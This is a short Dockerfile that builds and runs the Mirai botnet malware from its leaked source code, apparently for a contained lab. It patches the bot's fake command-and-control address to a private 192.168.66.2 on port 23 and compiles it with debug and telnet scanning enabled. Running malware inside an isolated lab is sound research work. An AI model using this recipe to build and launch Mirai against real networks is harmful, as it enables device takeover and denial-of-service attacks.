FROM ubuntu:latest

RUN apt update && apt install -y build-essential
WORKDIR /app

#COPY ../cnc/Mirai-Source-Code /app/Mirai-Source-Code
COPY Mirai-Source-Code /app/Mirai-Source-Code


WORKDIR /app/Mirai-Source-Code/mirai
RUN sed -i 's/ipv4_t LOCAL_ADDR;/extern &/' bot/includes.h
RUN sed -i 's/struct sockaddr_in srv_addr;/ipv4_t LOCAL_ADDR;\n&/' bot/main.c
RUN sed -i 's/#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)/#define FAKE_CNC_ADDR   INET_ADDR(192,168,66,2)/' bot/includes.h
RUN sed -i 's/#define FAKE_CNC_PORT   80/#define FAKE_CNC_PORT   23/' bot/includes.h

RUN gcc -std=c99 bot/*.c -DDEBUG -DMIRAI_TELNET -static -g -o /app/mirai.dbg

ENTRYPOINT sleep 15 && /app/mirai.dbg
